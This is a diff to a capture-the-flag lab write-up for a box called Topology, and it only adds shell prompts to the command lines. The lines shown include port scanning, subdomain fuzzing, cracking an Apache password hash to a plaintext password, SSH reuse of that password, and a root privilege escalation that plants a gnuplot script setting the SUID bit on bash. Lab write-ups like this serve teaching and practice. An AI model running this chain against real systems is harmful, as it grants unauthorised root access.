@@ -22,8 +22,8 @@ The path is short. LaTeX injection for arbitrary file read, pull an `.htpasswd` 
 Full TCP sweep then a versioned scan on the two open ports:
 
 ```bash
-nmap -p- --min-rate 10000 -T4 10.10.18.217
-nmap -p 22,80 -sCV 10.10.18.217
+$ nmap -p- --min-rate 10000 -T4 10.10.18.217
+$ nmap -p 22,80 -sCV 10.10.18.217
 ```
 
 ```
@@ -40,20 +40,20 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Stock Ubuntu service versions, so the web is the way in. I added the hostname and browsed port 80.
 
 ```bash
-echo '10.10.18.217 topology.htb' | sudo tee -a /etc/hosts
+$ echo '10.10.18.217 topology.htb' | sudo tee -a /etc/hosts
 ```
 
 The homepage was a department site. It leaked a contact email, `lklein@topology.htb`, which is a username candidate to keep in the back pocket. A page also linked to a LaTeX equation generator on another host. That hint plus the email pushed me toward virtual host enumeration.
 
 ```bash
-ffuf -u http://10.10.18.217 -H "Host: FUZZ.topology.htb" \
+$ ffuf -u http://10.10.18.217 -H "Host: FUZZ.topology.htb" \
   -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -mc all -ac
 ```
 
 Three subdomains came back: `dev`, `stats`, and `latex`. I added all of them:
 
 ```bash
-echo '10.10.18.217 topology.htb dev.topology.htb stats.topology.htb latex.topology.htb' | sudo tee -a /etc/hosts
+$ echo '10.10.18.217 topology.htb dev.topology.htb stats.topology.htb latex.topology.htb' | sudo tee -a /etc/hosts
 ```
 
 Walking each one:
@@ -104,7 +104,7 @@ The `$apr1$` prefix is Apache's MD5 crypt format, which john and hashcat both cr
 I cracked the apr1 hash with john and the rockyou list:
 
 ```bash
-john --format=md5crypt-long --wordlist=/usr/share/wordlists/rockyou.txt hash
+$ john --format=md5crypt-long --wordlist=/usr/share/wordlists/rockyou.txt hash
 ```
 
 ```
@@ -114,7 +114,7 @@ calculus20       (vdaisley)
 The dev vhost itself held nothing once I authenticated to it, but the password was the point: it was reused for the system account. `vdaisley:calculus20` worked over SSH:
 
 ```bash
-sshpass -p calculus20 ssh vdaisley@topology.htb
+$ sshpass -p calculus20 ssh vdaisley@topology.htb
 ```
 
 The user flag was in the home directory.
@@ -124,7 +124,7 @@ The user flag was in the home directory.
 I checked sudo first and got a hard no:
 
 ```bash
-sudo -l
+$ sudo -l
 ```
 
 ```
@@ -152,7 +152,7 @@ So the chain is clear: anything I drop into `/opt/gnuplot` named `*.plt` runs as
 The first attempts to inject POSIX commands directly failed, because gnuplot only understands its own scripting syntax, not `chmod` on its own line. The gnuplot manual has a `system` command that shells out to the OS, which is the bridge. I dropped a plot file that sets the SUID bit on bash:
 
 ```bash
-echo 'system "chmod u+s /bin/bash"' > /opt/gnuplot/priv.plt
+$ echo 'system "chmod u+s /bin/bash"' > /opt/gnuplot/priv.plt
 ```
 
 When the cron next ran, gnuplot executed my `system` call as root and bash became SUID:
@@ -165,7 +165,7 @@ ls -la /bin/bash
 Then `-p` preserves the effective root UID and gives a root shell:
 
 ```bash
-/bin/bash -p
+$ /bin/bash -p
 ```
 
 ```
